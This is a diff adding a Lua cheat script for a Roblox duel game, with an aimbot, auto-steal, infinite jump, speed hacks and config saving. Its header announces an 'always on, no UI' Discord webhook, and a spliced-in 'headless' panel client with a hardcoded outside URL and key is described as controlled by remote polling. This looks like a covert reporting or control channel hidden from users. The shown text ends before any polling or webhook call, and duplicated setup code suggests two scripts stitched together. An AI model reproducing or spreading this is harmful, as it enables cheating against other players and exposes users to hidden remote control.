@@ -1,0 +1,493 @@
+-- ============================================================
+-- GREEN DUELS V2 - WITH STAND DROP (Crasher) & JUMP DROP
+-- Stand drop = original Cursed Hub fling (safe)
+-- Jump drop = ascend then teleport
+-- FIXED: Q key no longer toggles speed after exiting Lagger mode
+-- FIXED: Settings no longer reset on duel join
+-- FIXED: Config now saves reliably, no corruption, backup system
+-- ADDED: Discord webhook (always on, no UI)
+-- ============================================================
+
+--[[
+  Panel Client v3 â€” Headless (no GUI)
+  Controlled via web panel polling only
+]]
+
+local BASE = "https://responsive-redo-bot.lovable.app"
+local KEY  = "Grin@1234"
+
+
+
+local Players            = game:GetService("Players")
+local HttpService        = game:GetService("HttpService")
+local RunService         = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService   = game:GetService("UserInputService")
+local TweenService       = game:GetService("TweenService")
+
+local request = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+if not request then return end
+
+local LP = Players.LocalPlayer
+if not LP then LP = Players.PlayerAdded:Wait() end
+
+
+if _G.GreenDuelsV2_Running then return end
+_G.GreenDuelsV2_Running = true
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local ContentProvider = game:GetService("ContentProvider")
+local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer")
+
+local _isfile = isfile or (syn and syn.isfile) or (getgenv and getgenv().isfile) or function() return false end
+local _readfile = readfile or (syn and syn.readfile) or (getgenv and getgenv().readfile) or function() return nil end
+local _writefile = writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or function() end
+local _delfile = delfile or (syn and syn.delfile) or (getgenv and getgenv().delfile) or function() end
+local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
+
+-- HTTP request function for webhook
+local _request = request or http_request or (syn and syn.request) or (game and game:GetService("HttpService") and game:GetService("HttpService").RequestAsync) or nil
+
+if not fireproximityprompt then
+    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
+        or (genv and genv().fireproximityprompt)
+        or function(prompt)
+            pcall(function()
+                prompt:InputHoldBegin()
+                task.wait(0.05)
+                prompt:InputHoldEnd()
+            end)
+        end
+end
+
+repeat task.wait() until game:IsLoaded()
+
+-- ============================================================
+-- DROP TYPES (Stand = Brainrot fling, Jump = ascend)
+-- ============================================================
+local DROP_TYPES = {
+    STAND = "Stand Drop",
+    JUMP = "Jump Drop"
+}
+local currentDropType = DROP_TYPES.STAND
+
+-- ============================================================
+-- CONFIG VERSION & EARLY LOAD
+-- ============================================================
+local CONFIG_VERSION = 2
+local CONFIG_FILE = "GreenDuelsConfig.json"
+local CONFIG_BACKUP = "GreenDuelsConfig.bak"
+
+local earlyConfig = nil
+local function loadEarlyConfig()
+    if not _isfile(CONFIG_FILE) then return nil end
+    local raw = _readfile(CONFIG_FILE)
+    if not raw then return nil end
+    local ok, cfg = pcall(function() return HttpService:JSONDecode(raw) end)
+    if ok and cfg and cfg.version == CONFIG_VERSION then return cfg end
+    return nil
+end
+earlyConfig = loadEarlyConfig()
+local introShouldPlay = (earlyConfig == nil or earlyConfig.introEnabled ~= false)
+
+-- Intro (skip if disabled)
+if introShouldPlay then
+    local _TS = TweenService
+    local _PG = LP:WaitForChild("PlayerGui")
+    local introGui = Instance.new("ScreenGui")
+    introGui.Name = "GreenHUBIntro"
+    introGui.ResetOnSpawn = false
+    introGui.IgnoreGuiInset = true
+    introGui.DisplayOrder = 999
+    introGui.Parent = _PG
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.BackgroundColor3 = Color3.new(0,0,0)
+    bg.BackgroundTransparency = 0.15
+    bg.BorderSizePixel = 0
+    bg.Parent = introGui
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 12
+    blur.Parent = game:GetService("Lighting")
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0,400,0,300)
+    container.Position = UDim2.new(0.5,-200,0.5,-150)
+    container.BackgroundTransparency = 1
+    container.Parent = bg
+
+    local LOGO_ID = "rbxassetid://16478039709"
+    task.spawn(function() pcall(function() ContentProvider:PreloadAsync({LOGO_ID}) end) end)
+
+    local logo = Instance.new("ImageLabel")
+    logo.Size = UDim2.new(0,120,0,120)
+    logo.Position = UDim2.new(0.5,-60,0,30)
+    logo.BackgroundTransparency = 1
+    logo.Image = LOGO_ID
+    logo.ImageColor3 = Color3.fromRGB(80,255,80)
+    logo.ImageTransparency = 1
+    logo.ScaleType = Enum.ScaleType.Fit
+    logo.Parent = container
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0,50)
+    title.Position = UDim2.new(0,0,0,170)
+    title.BackgroundTransparency = 1
+    title.Text = "GREEN DUELS V2"
+    title.TextColor3 = Color3.fromRGB(80,255,80)
+    title.TextTransparency = 1
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.2
+    title.TextStrokeColor3 = Color3.new(0,0,0)
+    title.Parent = container
+
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(0.8,0,0,30)
+    sub.Position = UDim2.new(0.1,0,0,230)
+    sub.BackgroundTransparency = 1
+    sub.Text = "LUCK IN PROGRESS"
+    sub.TextColor3 = Color3.fromRGB(100,200,100)
+    sub.TextTransparency = 1
+    sub.TextScaled = true
+    sub.Font = Enum.Font.GothamBold
+    sub.Parent = container
+
+    local loadingBg = Instance.new("Frame")
+    loadingBg.Size = UDim2.new(0.6,0,0,4)
+    loadingBg.Position = UDim2.new(0.2,0,0,275)
+    loadingBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    loadingBg.BackgroundTransparency = 0.5
+    loadingBg.BorderSizePixel = 0
+    loadingBg.Parent = container
+    Instance.new("UICorner", loadingBg).CornerRadius = UDim.new(0,2)
+
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0,0,1,0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(80,255,80)
+    loadingBar.BackgroundTransparency = 0.3
+    loadingBar.BorderSizePixel = 0
+    loadingBar.Parent = loadingBg
+    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0,2)
+
+    _TS:Create(bg, TweenInfo.new(0.7), {BackgroundTransparency = 0.15}):Play()
+    _TS:Create(logo, TweenInfo.new(0.7), {ImageTransparency = 0}):Play()
+    _TS:Create(title, TweenInfo.new(0.7), {TextTransparency = 0}):Play()
+    _TS:Create(sub, TweenInfo.new(0.7), {TextTransparency = 0.3}):Play()
+    _TS:Create(loadingBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)}):Play()
+    task.wait(2.5)
+    _TS:Create(bg, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
+    _TS:Create(logo, TweenInfo.new(0.8), {ImageTransparency = 1}):Play()
+    _TS:Create(title, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
+    _TS:Create(sub, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
+    _TS:Create(loadingBg, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
+    task.wait(1)
+    introGui:Destroy()
+    blur:Destroy()
+end
+
+-- ============================================================
+-- INFINITE JUMP (platform-based version)
+-- ============================================================
+local InfJumpPlatform = nil
+
+local function CreateIJP()
+    if InfJumpPlatform then return end
+    InfJumpPlatform = Instance.new("Part")
+    InfJumpPlatform.Name = "InfJumpPlatform"
+    InfJumpPlatform.Size = Vector3.new(8, 0.5, 8)
+    InfJumpPlatform.Anchored = true
+    InfJumpPlatform.CanCollide = true
+    InfJumpPlatform.Transparency = 1
+    InfJumpPlatform.Material = Enum.Material.ForceField
+    InfJumpPlatform.Parent = workspace
+end
+
+CreateIJP()
+
+-- ============================================================
+-- STATE
+-- ============================================================
+local State = {
+    normalSpeed=60, carrySpeed=30, laggerSpeed=10.1, laggerCarrySpeed=15,
+    speedToggled=false,
+    laggerMode=0,
+    infJumpEnabled=true, antiRagdollEnabled=false,
+    guiVisible=true, uiLocked=false,
+    isStealing=false, stealStartTime=nil, lastStealTick=0,
+    autoLeftEnabled=false, autoRightEnabled=false,
+    autoLeftPhase=1, autoRightPhase=1,
+    medusaLastUsed=0, medusaDebounce=false, medusaCounterEnabled=false,
+    batAimbotToggled=false, autoSwingEnabled=false,
+    hittingCooldown=false,
+    batCounterEnabled=false, batCounterDebounce=false,
+    dropEnabled=false, _tpInProgress=false,
+    lastMoveDir=Vector3.new(0,0,0),
+    _prevCarry=30, _prevSpeed=false,
+    stackButtonsHidden=false,
+    countdownActive=false,
+    stackButtonsLocked=false,
+    nukeOpt=false,
+    removeAcc=false,
+    antiLagEnabled=false,
+    stretchedResEnabled=false,
+    stretchFOV=120,
+    activeSky=nil,
+    tryardAnimEnabled=false,
+    introEnabled=true,
+    autoTPEnabled=false,
+    autoTPHeight=20,
+    autoTPConn=nil,
+}
+
+if earlyConfig and earlyConfig.introEnabled ~= nil then
+    State.introEnabled = earlyConfig.introEnabled
+end
+
+local Keys = {
+    speed=Enum.KeyCode.Q, guiHide=Enum.KeyCode.LeftControl,
+    autoLeft=Enum.KeyCode.L, autoRight=Enum.KeyCode.R,
+    lagger=Enum.KeyCode.Unknown,
+    tpDown=Enum.KeyCode.Unknown,
+    drop=Enum.KeyCode.H, aimbot=Enum.KeyCode.Unknown,
+}
+
+-- ============================================================
+-- INFINITE JUMP PLATFORM LOGIC
+-- ============================================================
+RunService.Heartbeat:Connect(function()
+    if not State.infJumpEnabled then 
+        if InfJumpPlatform then
+            InfJumpPlatform.Position = Vector3.new(0, -1000, 0)
+        end
+        return 
+    end
+    
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not (char and root and hum) then 
+        if InfJumpPlatform then
+            InfJumpPlatform.Position = Vector3.new(0, -1000, 0)
+        end
+        return 
+    end
+
+    local isJumping = UIS:IsKeyDown(Enum.KeyCode.Space)
+        or hum:GetState() == Enum.HumanoidStateType.Jumping
+        or hum.Jump
+
+    if isJumping then
+        if not InfJumpPlatform then CreateIJP() end
+        InfJumpPlatform.Position = root.Position - Vector3.new(0, 3.5, 0)
+        if root.Velocity.Y < 50 then
+            root.Velocity = Vector3.new(root.Velocity.X, 50, root.Velocity.Z)
+        end
+    else
+        if InfJumpPlatform then
+            InfJumpPlatform.Position = Vector3.new(0, -1000, 0)
+        end
+    end
+end)
+
+-- ============================================================
+-- TRYARD ANIMATION PACK
+-- ============================================================
+local TryardAnims = {
+    idle1 = "rbxassetid://133806214992291",
+    idle2 = "rbxassetid://94970088341563",
+    walk  = "rbxassetid://707897309",
+    run   = "rbxassetid://707861613",
+    jump  = "rbxassetid://116936326516985",
+    fall  = "rbxassetid://116936326516985",
+    climb = "rbxassetid://116936326516985",
+    swim  = "rbxassetid://116936326516985",
+    swimidle = "rbxassetid://116936326516985",
+}
+task.spawn(function()
+    pcall(function() ContentProvider:PreloadAsync({
+        TryardAnims.idle1, TryardAnims.idle2, TryardAnims.walk, TryardAnims.run,
+        TryardAnims.jump, TryardAnims.fall, TryardAnims.climb, TryardAnims.swim, TryardAnims.swimidle,
+    }) end)
+end)
+local tryardHeartbeatConn = nil
+local originalTryardAnims = nil
+local function isTryardPackAnim(id) for _,v in pairs(TryardAnims) do if v==id then return true end end return false end
+local function saveOriginalTryardAnims(char)
+    local animate = char:FindFirstChild("Animate")
+    if not animate then return end
+    local function g(obj) return obj and obj.AnimationId or nil end
+    local ids = {
+        idle1 = g(animate.idle and animate.idle.Animation1),
+        idle2 = g(animate.idle and animate.idle.Animation2),
+        walk  = g(animate.walk and animate.walk.WalkAnim),
+        run   = g(animate.run  and animate.run.RunAnim),
+        jump  = g(animate.jump and animate.jump.JumpAnim),
+        fall  = g(animate.fall and animate.fall.FallAnim),
+        climb = g(animate.climb and animate.climb.ClimbAnim),
+        swim  = g(animate.swim and animate.swim.Swim),
+        swimidle = g(animate.swimidle and animate.swimidle.SwimIdle),
+    }
+    if not isTryardPackAnim(ids.walk) then originalTryardAnims = ids end
+end
+local function applyTryardAnimPack(char)
+    local animate = char:FindFirstChild("Animate")
+    if not animate then return end
+    local function s(obj,id) if obj then obj.AnimationId=id end end
+    s(animate.idle and animate.idle.Animation1, TryardAnims.idle1)
+    s(animate.idle and animate.idle.Animation2, TryardAnims.idle2)
+    s(animate.walk and animate.walk.WalkAnim, TryardAnims.walk)
+    s(animate.run  and animate.run.RunAnim,   TryardAnims.run)
+    s(animate.jump and animate.jump.JumpAnim, TryardAnims.jump)
+    s(animate.fall and animate.fall.FallAnim, TryardAnims.fall)
+    s(animate.climb and animate.climb.ClimbAnim, TryardAnims.climb)
+    s(animate.swim and animate.swim.Swim, TryardAnims.swim)
+    s(animate.swimidle and animate.swimidle.SwimIdle, TryardAnims.swimidle)
+end
+local function stopTryardAnim()
+    if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect(); tryardHeartbeatConn=nil end
+    if originalTryardAnims and LP.Character then
+        local animate = LP.Character:FindFirstChild("Animate")
+        if animate then
+            local function s(obj,id) if obj then obj.AnimationId=id end end
+            s(animate.idle and animate.idle.Animation1, originalTryardAnims.idle1)
+            s(animate.idle and animate.idle.Animation2, originalTryardAnims.idle2)
+            s(animate.walk and animate.walk.WalkAnim, originalTryardAnims.walk)
+            s(animate.run  and animate.run.RunAnim,   originalTryardAnims.run)
+            s(animate.jump and animate.jump.JumpAnim, originalTryardAnims.jump)
+            s(animate.fall and animate.fall.FallAnim, originalTryardAnims.fall)
+            s(animate.climb and animate.climb.ClimbAnim, originalTryardAnims.climb)
+            s(animate.swim and animate.swim.Swim, originalTryardAnims.swim)
+            s(animate.swimidle and animate.swimidle.SwimIdle, originalTryardAnims.swimidle)
+        end
+    end
+end
+local function startTryardAnim()
+    if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect() end
+    local char = LP.Character
+    if char then
+        saveOriginalTryardAnims(char)
+        applyTryardAnimPack(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            for _, track in ipairs(hum:GetPlayingAnimationTracks()) do track:Stop(0) end
+            hum:ChangeState(Enum.HumanoidStateType.Running)
+        end
+    end
+    tryardHeartbeatConn = RunService.Heartbeat:Connect(function()
+        if not State.tryardAnimEnabled then return end
+        local c = LP.Character
+        if c then applyTryardAnimPack(c) end
+    end)
+end
+LP.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    if State.tryardAnimEnabled and tryardHeartbeatConn then
+        saveOriginalTryardAnims(char)
+        applyTryardAnimPack(char)
+    end
+end)
+
+-- ============================================================
+-- DEFAULT STACK BUTTON POSITIONS
+-- ============================================================
+local BTN_W=58; local BTN_H=58; local BTN_GAP=8; local COLS=2
+local stackDefs = {
+    {key="autoLeft",   label="AUTO\nLEFT"},
+    {key="autoRight",  label="AUTO\nRIGHT"},
+    {key="aimbot",     label="AIMBOT"},
+    {key="lagger",     label="LAGGER\nSPEED"},
+    {key="laggerCarry",label="LAGGER\nCARRY"},
+    {key="drop",       label="DROP"},
+    {key="tpDown",     label="TP\nDOWN"},
+    {key="carrySpeed", label="CARRY\nSPEED"},
+}
+local function getDefaultStackPos(i)
+    local col=(i-1)%COLS
+    local row2=math.floor((i-1)/COLS)
+    return UDim2.new(1,-(COLS*(BTN_W+BTN_GAP)-BTN_GAP+14)+col*(BTN_W+BTN_GAP),
+                     0.5,-(math.ceil(#stackDefs/COLS)*(BTN_H+BTN_GAP)-BTN_GAP)/2+row2*(BTN_H+BTN_GAP))
+end
+
+local Steal = { AutoStealEnabled=true, StealRadius=55, StealDuration=0.25, Data={} }
+
+-- ============================================================
+-- PRESETS
+-- ============================================================
+local Presets = {}
+local PRESET_FILE = "GreenDuelsPresets.json"
+local LAST_PRESET_FILE = "GreenDuelsLastPreset.json"
+
+local function buildPresetSnapshot() return {
+    normalSpeed=State.normalSpeed, carrySpeed=State.carrySpeed,
+    laggerSpeed=State.laggerSpeed, laggerCarrySpeed=State.laggerCarrySpeed,
+    stealRadius=Steal.StealRadius, stealDuration=Steal.StealDuration,
+    infJump=State.infJumpEnabled, antiRagdoll=State.antiRagdollEnabled,
+    medusaCounter=State.medusaCounterEnabled, batCounter=State.batCounterEnabled,
+    autoSteal=Steal.AutoStealEnabled,
+    autoTP=State.autoTPEnabled, autoTPHeight=State.autoTPHeight,
+} end
+local function savePresetsFile()
+    local ok,enc=pcall(function() return HttpService:JSONEncode(Presets) end)
+    if ok then pcall(function() _writefile(PRESET_FILE,enc) end) end
+end
+local function loadPresetsFile()
+    if not _isfile(PRESET_FILE) then return end
+    local raw; pcall(function() raw=_readfile(PRESET_FILE) end)
+    if raw then
+        local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
+        if ok and dec then Presets=dec end
+    end
+end
+local function saveLastPresetName(name)
+    local ok,enc=pcall(function() return HttpService:JSONEncode({lastPreset=name}) end)
+    if ok then pcall(function() _writefile(LAST_PRESET_FILE,enc) end) end
+end
+local function loadLastPresetName()
+    if not _isfile(LAST_PRESET_FILE) then return nil end
+    local raw; pcall(function() raw=_readfile(LAST_PRESET_FILE) end)
+    if raw then
+        local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
+        if ok and dec then return dec.lastPreset end
+    end
+    return nil
+end
+
+local MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,
+    [Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}
+
+-- Auto Left/Right positions
+local AP_L1     = Vector3.new(-476.48, -6.28, 92.73)
+local AP_L2     = Vector3.new(-483.12, -4.95, 94.80)
+local AP_L_FACE = Vector3.new(-482.25, -4.96, 92.09)
+local AP_R1     = Vector3.new(-476.16, -6.52, 25.62)
+local AP_R2     = Vector3.new(-483.06, -5.03, 25.48)
+local AP_R_FACE = Vector3.new(-482.06, -6.93, 35.47)
+
+local alConn, arConn = nil, nil
+local alPhase, arPhase = 1, 1
+
+local Conns={autoSteal=nil,antiRag=nil,autoLeft=nil,autoRight=nil,aimbot=nil,anchor={},progress=nil,batCounter=nil, autoTP=nil}
+local h,hrp
+local setAutoLeft,setAutoRight,setInfJump,setAntiRag
+local setMedusaCounter,setAimbot,setAutoSwing
+local setLagger,setLaggerCarry,setDropBrainrot,setInstaGrab
+local setNukeOpt,setRemoveAcc,setNoCam
+local setupMedusaCounter,stopMedusaCounter,startAntiRagdoll,stopAntiRagdoll
+local startAutoSteal,stopAutoSteal
+local startAutoLeft,stopAutoLeft,startAutoRight,stopAutoRight
+local saveConfig,loadConfig,runDrop,stopDrop,runTPDown
+local requestSave
+local startBatAimbot,stopBatAimbot,startBatCounter,stopBatCounter,setBatCounter
+local stackBtnRefs={}; local stackWrappers={}; local keybindBtnRefs={}
+local normalBox,carryBox,laggerBox,laggerCarryBox,uiScaleBox,stealRadBox
